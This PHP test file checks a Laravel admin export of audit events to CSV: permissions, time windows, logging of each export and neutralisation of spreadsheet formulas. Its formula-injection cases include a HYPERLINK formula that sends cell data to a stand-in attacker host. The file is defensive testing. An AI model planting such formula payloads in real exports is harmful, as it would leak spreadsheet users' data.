<?php

namespace Tests\Feature\Audit;

use App\Domain\Audit\Models\AuditEvent;
use App\Domain\Audit\Queries\AuditEventExportRows;
use App\Domain\Audit\Services\AuditRecorder;
use App\Domain\Identity\Enums\UserRole;
use App\Domain\Identity\Models\User;
use App\Support\Csv\SpreadsheetSafeText;
use Carbon\CarbonImmutable;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Testing\TestResponse;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use Symfony\Component\HttpFoundation\Response;
use Tests\TestCase;

class AuditExportTest extends TestCase
{
    use RefreshDatabase;

    private const URL = '/admin/exports/audit-events.csv';

    private function administrator(): User
    {
        return User::factory()->create([
            'role' => UserRole::Administrator,
            'is_active' => true,
        ]);
    }

    /**
     * @param  TestResponse<Response>  $response
     */
    private function download(TestResponse $response): string
    {
        ob_start();
        $response->sendContent();

        return (string) ob_get_clean();
    }

    /**
     * @return array<int, array<int, string>>
     */
    private function parse(string $csv): array
    {
        $rows = [];
        $handle = fopen('php://memory', 'r+b');
        $this->assertNotFalse($handle);
        fwrite($handle, $csv);
        rewind($handle);

        while (($row = fgetcsv($handle, 0, ',', '"', '')) !== false) {
            $rows[] = array_map(strval(...), $row);
        }

        fclose($handle);

        return $rows;
    }

    #[Test]
    public function an_administrator_downloads_the_log_as_csv(): void
    {
        $administrator = $this->administrator();

        app(AuditRecorder::class)->record(
            action: 'content_updated',
            subjectType: 'content_item',
            subjectId: '17',
            changes: ['title_ru' => ['before' => 'Старое', 'after' => 'Новое']],
            actorId: $administrator->id,
            subjectLabel: 'Тестовый материал',
        );

        $response = $this->actingAs($administrator)->get(self::URL);
        $response->assertOk();
        $response->assertHeader('Content-Type', 'text/csv; charset=UTF-8');
        $this->assertStringContainsString(
            'attachment;',
            (string) $response->headers->get('Content-Disposition'),
        );
        $this->assertStringContainsString(
            'no-store',
            (string) $response->headers->get('Cache-Control'),
        );

        $rows = $this->parse($this->download($response));

        $this->assertSame(AuditEventExportRows::HEADER, $rows[0]);
        $this->assertCount(2, $rows);

        $row = array_combine(AuditEventExportRows::HEADER, $rows[1]);

        $this->assertSame('content_updated', $row['action']);
        $this->assertSame('content_item', $row['subject_type']);
        $this->assertSame('17', $row['subject_id']);
        $this->assertSame('Тестовый материал', $row['subject_label']);
        $this->assertSame((string) $administrator->id, $row['actor_id']);
        $this->assertSame($administrator->email, $row['actor_email']);
        $this->assertMatchesRegularExpression(
            '/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/',
            $row['occurred_at_utc'],
        );
        $this->assertSame(
            ['title_ru' => ['before' => 'Старое', 'after' => 'Новое']],
            json_decode($row['changes_json'], true),
        );
    }

    /**
     * The columns are the stored machine values, so two administrators working
     * in different languages exchange the same bytes.
     */
    #[Test]
    public function the_file_is_identical_in_every_locale(): void
    {
        $administrator = $this->administrator();

        app(AuditRecorder::class)->record(
            action: 'content_created',
            subjectType: 'content_item',
            subjectId: '3',
            changes: [],
            actorId: $administrator->id,
        );

        $existing = AuditEvent::query()->count();
        $bodies = [];

        foreach (['tj', 'ru', 'en'] as $locale) {
            $this->app->setLocale($locale);

            // Each export records itself, so compare the rows that existed
            // before the loop rather than the growing tail.
            $bodies[$locale] = array_slice(
                $this->parse($this->download($this->actingAs($administrator)->get(self::URL))),
                0,
                $existing + 1,
            );
        }

        $this->assertSame($bodies['tj'], $bodies['ru']);
        $this->assertSame($bodies['ru'], $bodies['en']);
    }

    #[Test]
    public function taking_a_copy_of_the_log_is_itself_recorded(): void
    {
        $administrator = $this->administrator();

        $this->actingAs($administrator)->get(self::URL)->assertOk();

        $event = AuditEvent::query()->where('action', 'audit_exported')->sole();

        $this->assertSame('audit_log', $event->subject_type);
        $this->assertSame($administrator->id, $event->actor_id);
        $this->assertArrayHasKey('window', $event->changes);
    }

    /**
     * The export is bounded at the instant the request arrived, so it cannot
     * contain the entry recording itself.
     */
    #[Test]
    public function an_export_never_contains_its_own_entry(): void
    {
        $administrator = $this->administrator();

        $rows = $this->parse($this->download($this->actingAs($administrator)->get(self::URL)));

        $this->assertCount(1, $rows, 'Only the header row was expected.');
    }

    /**
     * @return array<string, array{string, string}>
     */
    public static function formulaPayloads(): array
    {
        return [
            'equals' => ['=1+1', "'=1+1"],
            'plus' => ['+1+1', "'+1+1"],
            'minus' => ['-1+1', "'-1+1"],
            'at sign' => ['@SUM(A1)', "'@SUM(A1)"],
            'tab' => ["\t=cmd", "'\t=cmd"],
            'carriage return' => ["\r=cmd", "'\r=cmd"],
            'plain text is untouched' => ['Паводок', 'Паводок'],
            'inner equals is untouched' => ['a=b', 'a=b'],
        ];
    }

    #[Test]
    #[DataProvider('formulaPayloads')]
    public function a_cell_a_spreadsheet_would_evaluate_is_neutralised(string $stored, string $expected): void
    {
        $this->assertSame($expected, SpreadsheetSafeText::cell($stored));
    }

    #[Test]
    public function a_stored_formula_reaches_the_file_as_text(): void
    {
        $administrator = $this->administrator();

        app(AuditRecorder::class)->record(
            action: 'content_updated',
            subjectType: 'content_item',
            subjectId: '9',
            changes: [],
            actorId: $administrator->id,
            subjectLabel: '=HYPERLINK("http://attacker.example/"&A1,"click")',
        );

        $rows = $this->parse($this->download($this->actingAs($administrator)->get(self::URL)));
        $row = array_combine(AuditEventExportRows::HEADER, $rows[1]);

        $this->assertStringStartsWith("'=", $row['subject_label']);
    }

    #[Test]
    public function control_characters_are_stripped(): void
    {
        $this->assertSame('ab', SpreadsheetSafeText::cell("a\x00b\x1F"));
        $this->assertSame('', SpreadsheetSafeText::cell(null));
        $this->assertSame('', SpreadsheetSafeText::cell(''));
        // Tab, newline and carriage return survive; CSV quoting handles them.
        $this->assertSame("a\nb", SpreadsheetSafeText::cell("a\nb"));
    }

    #[Test]
    public function the_window_bounds_which_rows_are_written(): void
    {
        $administrator = $this->administrator();

        foreach (['2026-01-01', '2026-06-01', '2026-08-01'] as $index => $day) {
            AuditEvent::query()->create([
                'occurred_at' => CarbonImmutable::parse($day.'T00:00:00Z'),
                'actor_id' => $administrator->id,
                'action' => 'content_created',
                'subject_type' => 'content_item',
                'subject_id' => (string) ($index + 1),
                'subject_label' => null,
                'changes' => [],
            ]);
        }

        $response = $this->actingAs($administrator)
            ->get(self::URL.'?from=2026-05-01T00:00:00Z&to=2026-07-01T00:00:00Z');

        $rows = $this->parse($this->download($response->assertOk()));

        $this->assertCount(2, $rows);
        $this->assertSame('2026-06-01T00:00:00Z', $rows[1][0]);
    }

    #[Test]
    public function an_impossible_window_is_rejected(): void
    {
        $this->actingAs($this->administrator())
            ->get(self::URL.'?from=2026-07-01T00:00:00Z&to=2026-01-01T00:00:00Z')
            ->assertSessionHasErrors('to');
    }

    /**
     * @return array<string, array{UserRole}>
     */
    public static function nonAdministratorRoles(): array
    {
        return [
            'operator' => [UserRole::Operator],
            'editor' => [UserRole::Editor],
        ];
    }

    #[Test]
    #[DataProvider('nonAdministratorRoles')]
    public function a_non_administrator_cannot_export_the_log(UserRole $role): void
    {
        $user = User::factory()->create(['role' => $role, 'is_active' => true]);

        $this->actingAs($user)->get(self::URL)->assertForbidden();
        $this->assertSame(0, AuditEvent::query()->where('action', 'audit_exported')->count());
    }

    #[Test]
    public function a_deactivated_administrator_cannot_export_the_log(): void
    {
        $user = User::factory()->create([
            'role' => UserRole::Administrator,
            'is_active' => false,
        ]);

        $this->actingAs($user)->get(self::URL)->assertForbidden();
    }

    #[Test]
    public function a_guest_cannot_export_the_log(): void
    {
        $this->get(self::URL)->assertRedirect('/admin/login');
        $this->assertSame(0, AuditEvent::query()->count());
    }

    #[Test]
    public function the_export_route_is_read_only(): void
    {
        $administrator = $this->administrator();

        $this->actingAs($administrator)->post(self::URL)->assertStatus(405);
        $this->actingAs($administrator)->delete(self::URL)->assertStatus(405);
    }
}
